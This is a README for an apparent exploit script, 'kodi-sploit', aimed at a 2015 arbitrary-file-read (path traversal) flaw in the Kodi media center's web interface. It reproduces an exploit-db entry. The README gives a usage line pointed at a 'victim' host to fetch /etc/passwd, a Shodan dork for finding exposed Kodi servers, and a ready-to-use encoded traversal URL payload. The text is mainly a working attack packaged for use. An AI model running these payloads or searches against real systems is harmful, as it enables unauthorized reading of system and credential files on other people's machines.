# kodi-sploit
Script to exploit the Kodi local file inclusion vulnerability.

# Usage

./kodi.sh victim.com /etc/passwd

# Depends:

* Curl
* Bash
* Linux (Proably works on OSX/Unix)

# From exploit-db
*Exploit Title: arbitrary file access kodi web interface*
Shodan dork: title:kodi
Date: 25-11-2015
Contact: https://twitter.com/mpronk89
Software Link: http://kodi.tv/
Original report:
http://forum.kodi.tv/showthread.php?tid=144110&pid=2170305#pid2170305
Version: v15
Tested on: linux
CVE : n/a

# The Vuln

kodi web interface vulnerable to arbitrary file read.

example:
<ip>:<port:/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd


for passwd

​(issue fixed in 2012, reintroduced in february 2015. Fixed again november
2015 for v16)
